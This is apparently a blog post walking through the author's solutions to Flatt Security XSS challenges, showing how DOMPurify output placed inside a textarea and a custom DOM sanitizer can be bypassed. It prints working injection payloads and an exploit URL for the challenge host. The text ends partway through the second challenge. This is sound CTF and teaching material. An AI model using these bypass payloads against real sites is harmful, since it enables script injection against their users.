<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Flatt Security XSS Challenge Solutions | Your awesome title</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Flatt Security XSS Challenge Solutions" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="There were three xss challenges from Flatt Security , which were all really good I really liked the last challenge which was authored by the legend Masato Kinugawa and I managed to solve it too :p" />
<meta property="og:description" content="There were three xss challenges from Flatt Security , which were all really good I really liked the last challenge which was authored by the legend Masato Kinugawa and I managed to solve it too :p" />
<link rel="canonical" href="http://localhost:4000/2024/12/07/flatt-security-xss-challenge-solutions.html" />
<meta property="og:url" content="http://localhost:4000/2024/12/07/flatt-security-xss-challenge-solutions.html" />
<meta property="og:site_name" content="Your awesome title" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-12-07T00:00:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Flatt Security XSS Challenge Solutions" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2024-12-07T00:00:00+05:30","datePublished":"2024-12-07T00:00:00+05:30","description":"There were three xss challenges from Flatt Security , which were all really good I really liked the last challenge which was authored by the legend Masato Kinugawa and I managed to solve it too :p","headline":"Flatt Security XSS Challenge Solutions","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2024/12/07/flatt-security-xss-challenge-solutions.html"},"url":"http://localhost:4000/2024/12/07/flatt-security-xss-challenge-solutions.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Your awesome title" />
<script src="//cdn.jsdelivr.net/npm/@microlink/vanilla@latest/umd/microlink.min.js"></script>

<script>
  document.addEventListener('DOMContentLoaded', function (event) {
    microlink('.card-preview')
  })
</script>
  
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">Your awesome title</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Flatt Security XSS Challenge Solutions</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-12-07T00:00:00+05:30" itemprop="datePublished">
        Dec 7, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>There were three xss challenges from Flatt Security , which were all really good I really liked the last challenge which was authored by the legend Masato Kinugawa and I managed to solve it too :p</p>

<h1 id="challenge-1-by-hamayanhamayan">Challenge 1 by @hamayanhamayan</h1>

<p>This was the most easiest one from the others.</p>

<p>hamayan\src\index.js</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">createDOMPurify</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">dompurify</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">JSDOM</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsdom</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nb">window</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">JSDOM</span><span class="p">(</span><span class="dl">''</span><span class="p">).</span><span class="nb">window</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">DOMPurify</span> <span class="o">=</span> <span class="nf">createDOMPurify</span><span class="p">(</span><span class="nb">window</span><span class="p">);</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">message</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">message</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="s2">`/?message=Yes%2C%20&lt;b&gt;we%20can&lt;%2Fb&gt;%21`</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="kd">const</span> <span class="nx">sanitized</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span> <span class="c1">// [1]</span>
  <span class="nx">res</span><span class="p">.</span><span class="nf">view</span><span class="p">(</span><span class="dl">"</span><span class="s2">/index.ejs</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="na">sanitized</span><span class="p">:</span> <span class="nx">sanitized</span> <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>

<p>On the server side on line [1] , Dompurify was used to sanitize the html from the <code class="language-plaintext highlighter-rouge">message</code> parameter and then the sanitized string from dompurify was passed to the template <code class="language-plaintext highlighter-rouge">index.ejs</code>
We have two injection points here , so the sanitized string is placed at the two places <code class="language-plaintext highlighter-rouge">&lt;%- sanitized %&gt;</code></p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="o">&lt;</span><span class="nx">p</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="o">&gt;&lt;%-</span> <span class="nx">sanitized</span> <span class="o">%&gt;&lt;</span><span class="sr">/b&gt;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="dl">"</span><span class="s2">get</span><span class="dl">"</span> <span class="nx">action</span><span class="o">=</span><span class="dl">""</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="o">&gt;&lt;%-</span> <span class="nx">sanitized</span> <span class="o">%&gt;&lt;</span><span class="sr">/textarea</span><span class="err">&gt;
</span></code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/3958697d-c279-4d2c-a99e-7e9167393fad" alt="image" /></p>

<p>Well Dompurify latest version is used so a direct bypass isn’t possible, let’s focus on the second insertion point which is inside <code class="language-plaintext highlighter-rouge">template</code> element. As in the first one there is no chance.
By default, the  <code class="language-plaintext highlighter-rouge">template</code> element’s content is not rendered, as we can see in the screenshot the injected html appears as it is ,not rendered as html.</p>

<p>Dompurify isn’t aware of the context where the sanitized data will be in use i.e <code class="language-plaintext highlighter-rouge">template</code> element in our case. So it’s possible to get xss here even though state of the art DOMPurify is in use.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;"</span><span class="nt">&gt;</span>shirley<span class="nt">&lt;/a&gt;</span>
</code></pre></div></div>

<p>https://yeswehack.github.io/Dom-Explorer/dom-explore , as can be seen the above payload is consider safe by dompurify as the string <code class="language-plaintext highlighter-rouge">&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;</code> is inside the attribute value.
<img src="https://github.com/user-attachments/assets/c361ba80-4406-4db9-93e8-aef00f9d3c20" alt="image" /></p>

<p>Things gets interesting when the same payload is used in context like this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"message"</span><span class="nt">&gt;</span> <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;"</span><span class="nt">&gt;</span>shirley<span class="nt">&lt;/a&gt;</span> <span class="nt">&lt;/textarea&gt;</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/b316663f-778e-4928-bfe5-4911cab5d53c" alt="image" /></p>

<p>When this is parsed by the browser , as earlier mentioned the content inside of <code class="language-plaintext highlighter-rouge">textarea</code> element doesn’t gets rendered so as soon as the  <code class="language-plaintext highlighter-rouge">&lt;/textarea&gt;</code> is seen by the browser it will close the <code class="language-plaintext highlighter-rouge">textarea</code> context right there. And rest of the part is no longer inside <code class="language-plaintext highlighter-rouge">textarea</code> so it gets render now as HTML. Thus giving us an xss vector <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=alert()&gt;</code></p>

<p>https://challenge-hamayan.quiz.flatt.training/?message=%3Ca%20id=%22%3C/textarea%3E%3Cimg%20src=x%20onerror=alert()%3E%22%3E
<img src="https://github.com/user-attachments/assets/0d44738c-eeb3-42e9-ab26-fb970df57120" alt="image" /></p>

<hr />

<h1 id="challenge-2-by-ryotkak">Challenge 2 by @ryotkak</h1>

<p>A very interesting challenge indeed</p>

<p>http://34.171.202.118/</p>

<p>This application allows you to  create drafts, but no html is allowed. On the server side it html encodes the input. Although the html encoded input goes through a custom xss sanitizer on the client side and then used in <code class="language-plaintext highlighter-rouge">innerHTML</code> but it passes html encoded version <code class="language-plaintext highlighter-rouge">&amp;lt; &amp;gt;</code> it looks useless so it suggest that there might be another vuln:</p>

<p><img src="https://github.com/user-attachments/assets/ca96cba1-4baf-4f76-bac1-96eff6121259" alt="image" /></p>

<p>When we create a draft, it provides us with an id in the url like this http://34.171.202.118/?draft_id=fbca1697-5c42-41a9-abdc-3628bdb5f054 when this page is load the following things happen in the background</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="k">async</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">has</span><span class="p">(</span><span class="dl">'</span><span class="s1">draft_id</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
                <span class="kd">const</span> <span class="nx">resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="s2">`/api/drafts?id=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">draft_id</span><span class="dl">'</span><span class="p">))}</span><span class="s2">`</span><span class="p">);</span>
                <span class="kd">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">resp</span><span class="p">.</span><span class="nf">text</span><span class="p">();</span>
                <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">content</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
                <span class="nf">previewContent</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>It takes the <code class="language-plaintext highlighter-rouge">draft_id</code> parameter value and use it in a fetch call to the <code class="language-plaintext highlighter-rouge">/api/drafts?id=</code> endpoint. The value of the id is url encoded. The response from this endpoint is then passed to a custom sanitizer, the sanitized output is then passed to the sink <code class="language-plaintext highlighter-rouge">innerHTML</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">function</span> <span class="nf">previewContent</span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">preview</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nf">sanitizeHtml</span><span class="p">(</span><span class="nx">input</span><span class="p">);</span> <span class="c1">// just in case</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>The response return from the <code class="language-plaintext highlighter-rouge">/api/drafts?id=</code> is going to be html encoded so it’s clear that the goal of this challenge is to find a way to make the <code class="language-plaintext highlighter-rouge">/api/drafts?id=</code> endpoint return our payload which is not html encoded and find a bypass for the Sanitizer then.</p>

<p>To get a start let’s try to find a bypass for the sanitizer first, it’s not dompurify so it shouldn’t give much trouble to us:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">const</span> <span class="nx">SANITIZER_CONFIG</span> <span class="o">=</span> <span class="p">{</span>
            <span class="na">DANGEROUS_TAGS</span><span class="p">:</span> <span class="p">[</span>
                <span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">style</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">object</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">embed</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">meta</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">link</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">base</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">frame</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">frameset</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">svg</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">math</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">template</span><span class="dl">'</span><span class="p">,</span>
            <span class="p">],</span>

            <span class="na">ALLOW_ATTRIBUTES</span><span class="p">:</span> <span class="kc">false</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="nf">sanitizeHtml</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">doc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DOMParser</span><span class="p">().</span><span class="nf">parseFromString</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">nodeIterator</span> <span class="o">=</span> <span class="nx">doc</span><span class="p">.</span><span class="nf">createNodeIterator</span><span class="p">(</span><span class="nx">doc</span><span class="p">,</span> <span class="nx">NodeFilter</span><span class="p">.</span><span class="nx">SHOW_ELEMENT</span><span class="p">);</span>

            <span class="k">while </span><span class="p">(</span><span class="nx">nodeIterator</span><span class="p">.</span><span class="nf">nextNode</span><span class="p">())</span> <span class="p">{</span>
                <span class="kd">const</span> <span class="nx">currentNode</span> <span class="o">=</span> <span class="nx">nodeIterator</span><span class="p">.</span><span class="nx">referenceNode</span><span class="p">;</span>
                <span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">nodeName</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span> <span class="k">instanceof</span> <span class="nx">NamedNodeMap</span><span class="p">)</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">remove</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">function</span><span class="dl">"</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">removeAttribute</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">function</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nf">warn</span><span class="p">(</span><span class="dl">"</span><span class="s2">DOM Clobbering detected!</span><span class="dl">"</span><span class="p">);</span>
                    <span class="k">return</span> <span class="dl">""</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">if </span><span class="p">(</span><span class="nx">SANITIZER_CONFIG</span><span class="p">.</span><span class="nx">DANGEROUS_TAGS</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">.</span><span class="nx">nodeName</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()))</span> <span class="p">{</span>
                    <span class="nx">currentNode</span><span class="p">.</span><span class="nf">remove</span><span class="p">();</span>
                <span class="p">}</span> <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">SANITIZER_CONFIG</span><span class="p">.</span><span class="nx">ALLOW_ATTRIBUTES</span> <span class="o">&amp;&amp;</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">attribute</span> <span class="k">of</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">currentNode</span><span class="p">.</span><span class="nf">removeAttribute</span><span class="p">(</span><span class="nx">attribute</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="nx">doc</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>From the <code class="language-plaintext highlighter-rouge">SANITIZER_CONFIG</code> you can see, it has list of elements which it regards as dangerous and <code class="language-plaintext highlighter-rouge">ALLOW_ATTRIBUTES</code> key is set to false which might indicate that we can’t have any attributes and the elements listed in the <code class="language-plaintext highlighter-rouge">DANGEROUS_TAGS</code> in our html.</p>

<p>The dirty string passed to <code class="language-plaintext highlighter-rouge">sanitizeHtml</code> , is first used to create a DOM Tree using the <code class="language-plaintext highlighter-rouge">DOMParser</code> and then it iterates over each node , first checks for the nodeName property which basically returns element name and checks if it’s in the <code class="language-plaintext highlighter-rouge">DANGEROUS_TAGS</code> array or not if it’s there it removes the node completely (means it’s child will also be removed)
The second check is for the attributes , as <code class="language-plaintext highlighter-rouge">ALLOW_ATTRIBUTES</code> is set to false it should remove all the attributes.</p>

<p>This the minimal structure of how a sanitizer is actually implemented, if you look at DOMPurify inner working it also creates a DOM Tree first then iterates and remove the dangerous stuffs.</p>

<p>In the <code class="language-plaintext highlighter-rouge">DANGEROUS_TAGS</code> list I saw that <code class="language-plaintext highlighter-rouge">textarea</code> isn’t there, so I thought that might be helpful.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">sanitizeHtml</span><span class="p">(</span><span class="s2">`&lt;textarea&gt;&lt;a id="&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;"&gt;&lt;/textarea&gt;`</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">&lt;textarea&gt;&amp;lt;a id="&lt;/textarea&gt;&lt;img onerror="alert()"&gt;"&amp;gt;
</span></code></pre></div></div>
<p>We can see with this vector , the <code class="language-plaintext highlighter-rouge">onerror</code> attribute remained there which was weird. As I assumed this would take care of all the attributes. I did setup breakpoint to understand where the magic happens but still couldn’t get. It seems it just ignores iterating over that specific element.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">attribute</span> <span class="k">of</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">currentNode</span><span class="p">.</span><span class="nf">removeAttribute</span><span class="p">(</span><span class="nx">attribute</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
                    <span class="p">}</span>
</code></pre></div></div>

<p>So this was the payload which I thought was intented, required user interaction but ok atleast we have something :</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;textarea&gt;&lt;a</span><span class="err">/</span><span class="na">id=</span><span class="s">"&lt;/textarea&gt;&lt;text/src='x'onmouseover='alert()'&gt;shirley"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>Moving on the server side code</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">RequestHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
    <span class="n">protocol_version</span> <span class="o">=</span> <span class="sh">'</span><span class="s">HTTP/1.1</span><span class="sh">'</span>
    <span class="n">content_type_text</span> <span class="o">=</span> <span class="sh">'</span><span class="s">text/plain; charset=utf-8</span><span class="sh">'</span>
    <span class="n">content_type_html</span> <span class="o">=</span> <span class="sh">'</span><span class="s">text/html; charset=utf-8</span><span class="sh">'</span>

    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">parsed_path</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="nf">urlparse</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">parsed_path</span><span class="p">.</span><span class="n">path</span>
        <span class="n">query</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="nf">parse_qs</span><span class="p">(</span><span class="n">parsed_path</span><span class="p">.</span><span class="n">query</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Cache-Control</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">max-age=3600</span><span class="sh">'</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_html</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">index_html</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">elif</span> <span class="n">path</span> <span class="o">==</span> <span class="sh">"</span><span class="s">/api/drafts</span><span class="sh">"</span><span class="p">:</span>
            <span class="n">draft_id</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="sh">''</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">if</span> <span class="n">draft_id</span> <span class="ow">in</span> <span class="n">drafts</span><span class="p">:</span>
                <span class="n">escaped</span> <span class="o">=</span> <span class="n">html</span><span class="p">.</span><span class="nf">escape</span><span class="p">(</span><span class="n">drafts</span><span class="p">[</span><span class="n">draft_id</span><span class="p">])</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">escaped</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="sa">b</span><span class="sh">''</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="sh">'</span><span class="s">Path %s not found</span><span class="sh">'</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">content_length</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">content_length</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">413</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Post is too large</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span>
        <span class="n">body</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">content_length</span><span class="p">)</span>
        <span class="n">draft_id</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="nf">uuid4</span><span class="p">())</span>
        <span class="n">drafts</span><span class="p">[</span><span class="n">draft_id</span><span class="p">]</span> <span class="o">=</span> <span class="n">body</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">draft_id</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">content_type</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">,</span> <span class="n">content_type</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Connection</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">keep-alive</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">body</span><span class="p">))</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
        <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
</code></pre></div></div>

